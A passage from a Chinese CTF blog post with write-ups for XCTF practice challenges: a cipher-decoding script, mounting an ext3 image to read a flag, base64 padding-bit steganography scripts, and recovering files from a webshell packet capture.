<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="comment"># python3</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#解密字符</span></span><br><span class="line">c = <span class="string">&#x27;;8842101220480224404014224202480122&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>(<span class="params">c</span>):</span></span><br><span class="line">	c = c.split(<span class="string">&#x27;;0&#x27;</span>;)<span class="comment">#分割</span></span><br><span class="line">	print(c)	</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">		a = <span class="number">0</span></span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">			a += <span class="built_in">int</span>(j)</span><br><span class="line">		print(<span class="built_in">chr</span>(a+<span class="built_in">ord</span>(<span class="string">&#x27;;A&#x27;</span>;)-<span class="number">1</span>),end=<span class="string">&#x27;;&#x27;</span>;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;;__main__&#x27;</span>;:</span><br><span class="line">	decode(c)</span><br></pre></td></tr></table></figure>

<p>[/collapse]</p>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ext3"><a href="#ext3" class="headerlink" title="ext3"></a>ext3</h3><p>[collapse title=”展开查看详情” status=”false”]</p>
<p>题目提示是 Linux 系统镜像，首先反应是内存取证，然后使用 volatility 无法挂载。于是另寻方法，发现使用 IDA 32 位能成功打开，然后是查找字符串 shift+f12 ，因为内存镜像中的字符串也是可以被 IDA 读取的。加载字符串后，搜索 flag 发现 flag.txt 文件地址： O7avZhikgKgbF/flag.txt 。</p>
<p>然后就是怎么提取文件，正常情况下是用 volatility dump 命令，问题是现在加载不了。我采取用将其挂载到 Linux 虚拟机上。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#创建挂载文件夹</span><br><span class="line">mkdir ext3</span><br><span class="line">#挂载</span><br><span class="line">mount f1fc23f5c743425d9e0073887c846d23 ext3</span><br><span class="line">#取消挂载</span><br><span class="line"><span class="meta">#umount ext3</span></span><br><span class="line">cat O7avZhikgKgbF/flag.txt</span><br></pre></td></tr></table></figure>

<p>当然也可以不用 IDA 分析，直接挂载后搜索 <code>find / -name flag.txt</code></p>
<p>[/collapse]</p>
<h3 id="base64stego"><a href="#base64stego" class="headerlink" title="base64stego"></a>base64stego</h3><p>[collapse title=”展开查看详情” status=”false”]</p>
<p>base64 隐写题目。隐写原理来自<a target="_blank" rel="noopener" href="https://www.tr0y.wang/2017/06/14/Base64steg/">tr0y</a>：</p>
<p>隐写原理<br>注意红色的 0, 我们在解码的时候将其丢弃了, 所以这里的值不会影响解码. 所以我们可以在这进行隐写.<br>为什么等号的那部分 0 不能用于隐写? 因为修改那里的二进制值会导致等号数量变化, 解码的第 1 步会受影响. 自然也就破坏了源字符串.<br>而红色部分的 0 是作为最后一个字符二进制的组成部分, 还原时只用到了最后一个字符二进制的前部分, 后面的部分就不会影响还原.<br>唯一的影响就是最后一个字符会变化. 如下图</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200315111022.png"></p>
<p>如果你直接解密’VHIweQ==’与’VHIweR==’, 得到的结果都是’Tr0y’.</p>
<p>当然, 一行 base64 顶多能有 2 个等号, 也就是有 2*2 位的可隐写位. 所以我们得弄很多行, 才能隐藏一个字符串, 这也是为什么题目给了一大段 base64 的原因.<br>接下来, 把要隐藏的 flag 转为 8 位二进制, 塞进去就行了.</p>
<p>加密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">flag = <span class="string">&#x27;;Tr0y&#123;Base64isF4n&#125;&#x27;</span>; <span class="comment">#flag</span></span><br><span class="line">bin_str = <span class="string">&#x27;;&#x27;</span>;.join([<span class="built_in">bin</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;;0b&#x27;</span>;, <span class="string">&#x27;;&#x27;</span>;).zfill(<span class="number">8</span>) <span class="keyword">for</span> c <span class="keyword">in</span> flag])</span><br><span class="line">base64chars = <span class="string">&#x27;;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span>;</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;;0.txt&#x27;</span>;, <span class="string">&#x27;;rb&#x27;</span>;) <span class="keyword">as</span> f0, <span class="built_in">open</span>(<span class="string">&#x27;;1.txt&#x27;</span>;, <span class="string">&#x27;;wb&#x27;</span>;) <span class="keyword">as</span> f1: <span class="comment">#&#x27;;0.txt&#x27;;是明文, &#x27;;1.txt&#x27;;用于存放隐写后的 base64</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f0.readlines():</span><br><span class="line">        rowstr = base64.b64encode(line.replace(<span class="string">&#x27;;\n&#x27;</span>;, <span class="string">&#x27;;&#x27;</span>;))</span><br><span class="line">        equalnum = rowstr.count(<span class="string">&#x27;;=&#x27;</span>;)</span><br><span class="line">        <span class="keyword">if</span> equalnum <span class="keyword">and</span> <span class="built_in">len</span>(bin_str):</span><br><span class="line">            offset = <span class="built_in">int</span>(<span class="string">&#x27;;0b&#x27;</span>;+bin_str[:equalnum * <span class="number">2</span>], <span class="number">2</span>)</span><br><span class="line">            char = rowstr[<span class="built_in">len</span>(rowstr) - equalnum - <span class="number">1</span>]</span><br><span class="line">            rowstr = rowstr.replace(char, base64chars[base64chars.index(char) + offset])</span><br><span class="line">            bin_str = bin_str[equalnum*<span class="number">2</span>:]</span><br><span class="line">        f1.write(rowstr + <span class="string">&#x27;;\n&#x27;</span>;)</span><br></pre></td></tr></table></figure>

<p>解密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: cp936 -*-</span></span><br><span class="line">b64chars = <span class="string">&#x27;;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span>;</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;;1.txt&#x27;</span>;, <span class="string">&#x27;;rb&#x27;</span>;) <span class="keyword">as</span> f:</span><br><span class="line">    bin_str = <span class="string">&#x27;;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> f.readlines():</span><br><span class="line">        stegb64 = <span class="string">&#x27;;&#x27;</span>;.join(line.split())</span><br><span class="line">        rowb64 =  <span class="string">&#x27;;&#x27;</span>;.join(stegb64.decode(<span class="string">&#x27;;base64&#x27;</span>;).encode(<span class="string">&#x27;;base64&#x27;</span>;).split())</span><br><span class="line">        offset = <span class="built_in">abs</span>(b64chars.index(stegb64.replace(<span class="string">&#x27;;=&#x27;</span>;,<span class="string">&#x27;;&#x27;</span>;)[-<span class="number">1</span>])-b64chars.index(rowb64.replace(<span class="string">&#x27;;=&#x27;</span>;,<span class="string">&#x27;;&#x27;</span>;)[-<span class="number">1</span>]))</span><br><span class="line">        equalnum = stegb64.count(<span class="string">&#x27;;=&#x27;</span>;) <span class="comment">#no equalnum no offset</span></span><br><span class="line">        <span class="keyword">if</span> equalnum:</span><br><span class="line">            bin_str += <span class="built_in">bin</span>(offset)[<span class="number">2</span>:].zfill(equalnum * <span class="number">2</span>)</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;;&#x27;</span>;.join([<span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>)) <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>)]) <span class="comment">#8 位一组</span></span><br></pre></td></tr></table></figure>

<p>[/collapse]</p>
<h3 id="功夫再高也怕菜刀"><a href="#功夫再高也怕菜刀" class="headerlink" title="功夫再高也怕菜刀"></a>功夫再高也怕菜刀</h3><p>[collapse title=”展开查看详情” status=”false”]</p>
<p>分组字节流查询字符串 flag.txt 发现有结果</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200315214046.png"></p>
<p>将流量包用 foremost 分析出压缩包 00002778.zip ，需密码才能解压 flag.txt ，继续查询流量，发现有 6666.jpg </p>
<p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200315154335.png"></p>
<p>右键跟踪 tcp 流量，点击 save as 保存数据，用文本编辑器打开，将 FFD8 jpg 文件头前数据删除，以及最后一个 FFD9 后面数据删除，全选复制。</p>
<p>用 winhex 或者 010editor 新建一个空白文件，以 ascii-hex 写入数据，并保存为 jpg ，获得解压密码。</p>
<p>[/collapse]</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">SkYe231</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://skyedai910.github.io/archives/20e728e/">https://skyedai910.github.io/archives/20e728e/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://skyedai910.github.io" target="_blank">SkYe231 Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Writeup/">Writeup</a><a class="post-meta__tags" href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">攻防世界</a><a class="post-meta__tags" href="/tags/xctf/">xctf</a></div><div class="post_share"><div class="social-share" data-image="/img/default_cover3.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/archives/cfd73b01/"><img class="prev-cover" data-lazy-src="/img/default_cover4.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">DASCTF 安恒四月春季战 Writeup</div></div></a></div><div class="next-post pull-right"><a href="/archives/4a91183a/"><img class="next-cover" data-lazy-src="/img/default_cover2.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">midnight-sun-ctf-2020-quals-writeup</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/archives/205/" title="2020 CISCN Writeup"><img class="cover" data-lazy-src="/img/default_cover0.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-03-26</div><div class="title">2020 CISCN Writeup</div></div></a></div><div><a href="/archives/22e3ff4c/" title="2020 De1CTF Writeup"><img class="cover" data-lazy-src="/img/default_cover5.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-03-26</div><div class="title">2020 De1CTF Writeup</div></div></a></div><div><a href="/archives/18e23abd/" title="2020 RedpwnCTF Writeup"><img class="cover" data-lazy-src="/img/default_cover0.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-03-26</div><div class="title">2020 RedpwnCTF Writeup</div></div></a></div><div><a href="/archives/216/" title="2020 SWPUCTF 部分Pwn Writeup"><img class="cover" data-lazy-src="/img/default_cover3.png" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-03-26</div><div class="title">2020 SWPUCTF 部分Pwn Writeup</div></div></a></div><div><a href="/archives/215/" title="2020 湖湘杯 PWN WriteUp"><img class="cover" data-lazy-src="/img/default_cover4.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-03-26</div><div class="title">2020 湖湘杯 PWN WriteUp</div></div></a></div><div><a href="/archives/212/" title="2020 西普杯 信息安全铁人三项 第四赛区 Writeup"><img class="cover" data-lazy-src="/img/default_cover2.png" alt="cover"><div class="content is-center"><div class="date"><i class="fas fa-history fa-fw"></i> 2021-03-26</div><div class="title">2020 西普杯 信息安全铁人三项 第四赛区 Writeup</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" data-lazy-src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">SkYe231</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">50</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">71</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div><div class="card-info-social-icons is-center"><a class="social-icon" href="mailto:skye231@foxmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://skyedai910.github.io/atom.xml" target="_blank" title=""><i class="fas fa-rss"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">请修改默认公告</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">1.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#dice-game"><span class="toc-number">1.1.</span> <span class="toc-text">dice_game</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%83%85%E5%86%B5"><span class="toc-number">1.1.1.</span> <span class="toc-text">基本情况</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">保护措施</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">1.1.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP"><span class="toc-number">1.1.3.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn1"><span class="toc-number">1.2.</span> <span class="toc-text">pwn1</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%83%85%E5%86%B5-1"><span class="toc-number">1.2.1.</span> <span class="toc-text">基本情况</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E6%8E%AA%E6%96%BD-1"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">保护措施</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%A0%88%E6%BA%A2%E5%87%BA"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">栈溢出</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="toc-number">1.2.2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#EXP-1"><span class="toc-number">1.2.3.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#stack2"><span class="toc-number">1.3.</span> <span class="toc-text">stack2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#note-service2"><span class="toc-number">1.4.</span> <span class="toc-text">note-service2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn-100"><span class="toc-number">1.5.</span> <span class="toc-text">pwn-100</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pwn-200"><span class="toc-number">1.6.</span> <span class="toc-text">pwn-200</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CGfsb"><span class="toc-number">1.7.</span> <span class="toc-text">CGfsb</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#level3"><span class="toc-number">1.8.</span> <span class="toc-text">level3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#int-overflow"><span class="toc-number">1.9.</span> <span class="toc-text">int_overflow</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#guess-num"><span class="toc-number">1.10.</span> <span class="toc-text">guess_num</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#string"><span class="toc-number">1.11.</span> <span class="toc-text">string</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mobile"><span class="toc-number">2.</span> <span class="toc-text">Mobile</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#eastjni"><span class="toc-number">2.1.</span> <span class="toc-text">eastjni</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.1.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF-2"><span class="toc-number">2.1.2.</span> <span class="toc-text">思路</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easyjava"><span class="toc-number">2.2.</span> <span class="toc-text">easyjava</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B9%82%E6%95%B0%E5%8A%A0%E5%AF%86"><span class="toc-number">3.1.</span> <span class="toc-text">幂数加密</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Misc"><span class="toc-number">4.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ext3"><span class="toc-number">4.1.</span> <span class="toc-text">ext3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#base64stego"><span class="toc-number">4.2.</span> <span class="toc-text">base64stego</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%9F%E5%A4%AB%E5%86%8D%E9%AB%98%E4%B9%9F%E6%80%95%E8%8F%9C%E5%88%80"><span class="toc-number">4.3.</span> <span class="toc-text">功夫再高也怕菜刀</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/archives/bdb75c49/" title="NEPCTF2021 Writeup"><img data-lazy-src="/img/default_cover0.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="NEPCTF2021 Writeup"/></a><div class="content"><a class="title" href="/archives/bdb75c49/" title="NEPCTF2021 Writeup">NEPCTF2021 Writeup</a><time datetime="2021-03-28T07:57:34.289Z" title="更新于 2021-03-28 15:57:34">2021-03-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/e77640bd/" title="CVE-2020-8423TL-WR841N栈溢出复现"><img data-lazy-src="/img/default_cover6.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CVE-2020-8423TL-WR841N栈溢出复现"/></a><div class="content"><a class="title" href="/archives/e77640bd/" title="CVE-2020-8423TL-WR841N栈溢出复现">CVE-2020-8423TL-WR841N栈溢出复现</a><time datetime="2021-03-28T03:56:18.197Z" title="更新于 2021-03-28 11:56:18">2021-03-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/12117287/" title="Pwnable.kr unlink"><img data-lazy-src="/img/default_cover6.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Pwnable.kr unlink"/></a><div class="content"><a class="title" href="/archives/12117287/" title="Pwnable.kr unlink">Pwnable.kr unlink</a><time datetime="2021-03-26T09:04:13.982Z" title="更新于 2021-03-26 17:04:13">2021-03-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/e258fe4d/" title="组建隧道中转流量（自建IPLC实现落地）"><img data-lazy-src="/img/default_cover2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="组建隧道中转流量（自建IPLC实现落地）"/></a><div class="content"><a class="title" href="/archives/e258fe4d/" title="组建隧道中转流量（自建IPLC实现落地）">组建隧道中转流量（自建IPLC实现落地）</a><time datetime="2021-03-26T09:02:03.023Z" title="更新于 2021-03-26 17:02:03">2021-03-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/archives/2a024eda/" title="劫持64位静态程序fini_array进行ROP攻击"><img data-lazy-src="/img/default_cover6.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="劫持64位静态程序fini_array进行ROP攻击"/></a><div class="content"><a class="title" href="/archives/2a024eda/" title="劫持64位静态程序fini_array进行ROP攻击">劫持64位静态程序fini_array进行ROP攻击</a><time datetime="2021-03-26T09:01:15.659Z" title="更新于 2021-03-26 17:01:15">2021-03-26</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/default_cover3.png')"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2021 By SkYe231</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text"><a href="https://cloud.tencent.com/product/wh?from=12331" target="_blank">Hosted BY 云开发 Cloudbase</a>&nbsp;|&nbsp;<a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank"><img src="https://mrskye.cn-gd.ufileos.com/img/2020-07-01-lGwrnPz3GuV4odmM.png" align="top" style="width:48px"></a><br /><div class="github-badge"><a rel="license" href="http://beian.miit.gov.cn/" target="_blank" title="粤ICP备20056619号"><span class="badge-subject">粤ICP备</span><span class="badge-value bg-black">20056619号</span></a></div></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>